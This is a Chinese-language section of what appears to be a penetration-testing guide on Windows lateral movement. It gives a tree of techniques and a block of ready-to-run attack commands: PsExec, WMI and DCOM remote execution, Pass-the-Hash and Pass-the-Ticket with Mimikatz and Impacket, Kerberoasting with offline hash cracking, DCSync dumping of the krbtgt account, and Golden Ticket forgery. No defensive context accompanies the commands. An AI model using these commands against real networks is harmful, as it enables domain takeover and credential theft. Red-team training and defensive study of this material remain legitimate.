# 横向移动技术

### 4.1 Windows横向移动

```
Windows横向移动技术：

1. 远程服务利用
   ├── RDP (Remote Desktop Protocol)
   │   ├── 交互式远程桌面
   │   ├── 远程桌面网关
   │   └── RDP会话劫持
   ├── SMB (Server Message Block)
   │   ├── 管理共享 (C$, ADMIN$)
   │   ├── PsExec工具
   │   └── WMI远程执行
   ├── WinRM (Windows Remote Management)
   │   ├── PowerShell远程执行
   │   └── WinRS命令行
   ├── DCOM (Distributed COM)
   │   ├── MMC20.Application
   │   ├── ShellWindows
   │   └── ExcelDDE
   └── SSH (OpenSSH for Windows)

2. 凭证传递攻击
   ├── Pass-the-Hash (PtH)
   ├── Pass-the-Ticket (PtT)
   ├── Overpass-the-Hash
   ├── Pass-the-Key
   └── Golden Ticket / Silver Ticket

3. 活动目录攻击
   ├── Kerberoasting
   ├── AS-REP Roasting
   ├── DCSync
   ├── ACL滥用
   ├── 委派攻击
   │   ├── 非约束委派
   │   ├── 约束委派
   │   └── 基于资源的约束委派
   ├── ADCS攻击
   │   ├── 证书模板滥用
   │   └── ESC1-ESC8
   └── Exchange攻击

4. 横向工具转移
   ├── PsExec
   ├── WinRM
   ├── WMI
   ├── DCOM
   ├── Win32_Process
   └── Scheduled Tasks
```

#### 横向移动命令示例

```bash
# 1. PsExec横向移动
psexec \\target -u DOMAIN\user -p password cmd.exe
psexec \\target -u DOMAIN\user -p password -s cmd.exe  # SYSTEM权限

# 2. WinRM/PowerShell远程
Enter-PSSession -ComputerName target -Credential DOMAIN\user
Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential DOMAIN\user

# 3. WMI远程执行
wmic /node:target /user:DOMAIN\user /password:passwd process call create "cmd.exe"

# 4. DCOM横向移动 (MMC20.Application)
$dcom = [System.Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","target"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","")

# 5. Pass-the-Hash攻击
# 使用Mimikatz
mimikatz.exe "sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:cmd.exe"

# 使用Impacket
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH user@target
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH user@target
python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTLM_HASH user@target

# 6. Pass-the-Ticket攻击
# 导出并注入票据
mimikatz.exe "kerberos::ptt ticket.kirbi"

# 7. Kerberoasting
# 请求服务票据
python3 GetUserSPNs.py domain.local/user:password -request
# 离线破解
hashcat -m 13100 hash.txt wordlist.txt

# 8. DCSync攻击
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"
python3 secretsdump.py domain.local/user:password@DC_IP

# 9. Overpass-the-Hash
mimikatz.exe "sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:powershell.exe"

# 10. Golden Ticket
mimikatz.exe "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt"
```
